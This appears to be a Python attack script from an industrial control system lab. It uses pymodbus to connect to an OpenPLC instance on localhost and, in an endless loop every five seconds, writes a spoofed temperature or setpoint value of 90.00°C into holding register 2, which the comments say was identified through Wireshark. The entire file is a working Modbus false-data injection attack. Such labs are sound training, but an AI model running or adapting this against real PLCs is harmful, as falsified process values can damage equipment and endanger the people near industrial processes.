from pymodbus.client import ModbusTcpClient
import time

PLC_IP = "127.0.0.1"
PLC_PORT = 502  

# Create a Modbus/TCP client and connect to the PLC
client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
client.connect()

print("[+] Connected to OpenPLC")

while True:
    # Inject a fake setpoint/temperature value.
    # In this lab, values are scaled by x100 (e.g., 9000 = 90.00°C)
    injected_value = 9000

    # Write the injected value into holding register 2 (identified via Wireshark analysis)
    response = client.write_register(2, injected_value)

    print(f"Injected value into register 2: {injected_value / 100:.2f}°C")

    time.sleep(5)

